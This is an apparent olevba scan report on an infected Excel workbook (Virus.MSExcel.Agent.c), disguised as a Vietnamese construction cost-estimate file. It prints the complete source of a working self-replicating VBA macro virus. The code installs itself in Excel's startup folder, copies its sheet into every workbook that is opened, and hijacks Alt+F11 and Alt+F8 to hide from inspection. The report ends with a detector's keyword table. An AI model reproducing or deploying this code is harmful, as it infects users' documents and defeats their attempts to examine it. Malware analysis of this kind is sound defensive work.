olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSExcel.Agent.c-439b4cd65a7583e4f17efeafaa5f13dff424f79e
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Sheet2.cls 
in file: Virus.MSExcel.Agent.c-439b4cd65a7583e4f17efeafaa5f13dff424f79e - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet4.cls 
in file: Virus.MSExcel.Agent.c-439b4cd65a7583e4f17efeafaa5f13dff424f79e - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet4'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet11.cls 
in file: Virus.MSExcel.Agent.c-439b4cd65a7583e4f17efeafaa5f13dff424f79e - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet11'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet3.cls 
in file: Virus.MSExcel.Agent.c-439b4cd65a7583e4f17efeafaa5f13dff424f79e - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet3'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Sheet5.cls 
in file: Virus.MSExcel.Agent.c-439b4cd65a7583e4f17efeafaa5f13dff424f79e - OLE stream: '_VBA_PROJECT_CUR/VBA/Sheet5'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO ThisWorkbook.cls 
in file: Virus.MSExcel.Agent.c-439b4cd65a7583e4f17efeafaa5f13dff424f79e - OLE stream: '_VBA_PROJECT_CUR/VBA/ThisWorkbook'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO StartUp.bas 
in file: Virus.MSExcel.Agent.c-439b4cd65a7583e4f17efeafaa5f13dff424f79e - OLE stream: '_VBA_PROJECT_CUR/VBA/StartUp'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub auto_open()
  On Error Resume Next
  If ThisWorkbook.Path <> Application.StartupPath And Dir(Application.StartupPath & "\" & "StartUp.xls") = "" Then
    Application.ScreenUpdating = False
    ThisWorkbook.Sheets("StartUp").Copy
    ActiveWorkbook.SaveAs (Application.StartupPath & "\" & "StartUp.xls")
    n$ = ActiveWorkbook.Name
    ActiveWindow.Visible = False
    Workbooks("StartUp.xls").Save
    'Workbooks(n$).Close (False)
  End If
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnKey "%{F8}", "StartUp.xls!escape"
End Sub

Sub ycop()
  On Error Resume Next
  If ActiveWorkbook.Sheets(1).Name <> "StartUp" Then
    Application.ScreenUpdating = False
    n$ = ActiveSheet.Name
    Workbooks("StartUp.xls").Sheets("StartUp").Copy before:=Worksheets(1)
    Sheets(n$).Select
  End If
End Sub

Sub escape()
    On Error Resume Next
    Application.OnSheetActivate = "StartUp.xls!back"
    Application.OnKey "%{F11}"
    Application.OnKey "%{F8}"
    Application.SendKeys "%{F11}"
    Application.SendKeys "%{F8}"
    For Each book In Workbooks
        Application.DisplayAlerts = False
        If book <> "StartUp.xls" Then book.Sheets("StartUp").Delete
    Next
    For Each book In Workbooks
        If book.Name = "StartUp.xls" Then
        book.Close
    End If
    Next
End Sub

Sub back()
  On Error Resume Next
  Application.OnKey "%{F8}", "StartUp.xls!escape"
  Application.OnKey "%{F11}", "StartUp.xls!escape"
  Application.OnSheetActivate = "StartUp.xls!ycop"
  Application.OnTime Now + TimeValue("00:00:01"), "StartUp.xls!ycop"
  Workbooks.Open Application.StartupPath & "\StartUp.xls"
End Sub
-------------------------------------------------------------------------------
VBA MACRO xlm_macro.txt 
in file: xlm_macro - OLE stream: 'xlm_macro'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' 0085     15 BOUNDSHEET : Sheet Information - Visual Basic module, visible -  StartU
' 0085     25 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tong hop kinh ph
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Du toa
' 0085     25 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Chenh lech vat t
' 0085     24 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Phan tich vat t
' 0085     23 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tong hop vat t
' 0085     22 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Gia tri vat t
' 0085     24 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Phan tich ca ma
' 0085     23 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Du lieu dau va
' 0085     28 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tien luong nhan con
' 0085     32 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Chenh lech vat tu ca ma
' 0085     29 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Chiet tinh don gia C
' 0085     26 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Chi phi van chuye
' 0085     26 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Gia giao VL den H
' 0085     21 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Gia VL den H
' 0085     24 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Don gia chi tie
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Du tha
' 0085     23 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tu van Thiet k
' 0085     19 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  QD 957-200
' 0085     21 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Cong van 175
' 0085     29 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Bang tra Chi phi kha
' 0085     21 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tong hop DTC
' 0085     21 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tong hop CPT
' 0085     27 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tong hop DT CPXD T
' 0085     24 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Tien do thi con
' 0085     17 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Bia ngoa
' 0085     15 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Bia lo
' 0085     19 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Thuyet min
' 0085     19 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Bia du toa
' 0085     14 BOUNDSHEET : Sheet Information - worksheet or dialog sheet, visible -  Confi
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |auto_open           |Runs when the Excel Workbook is opened       |
|Suspicious|Open                |May open a file                              |
|Suspicious|ActiveWorkbook.SaveA|May save the current workbook                |
|          |s                   |                                             |
|Suspicious|SendKeys            |May control another application by simulating|
|          |                    |user keystrokes                              |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

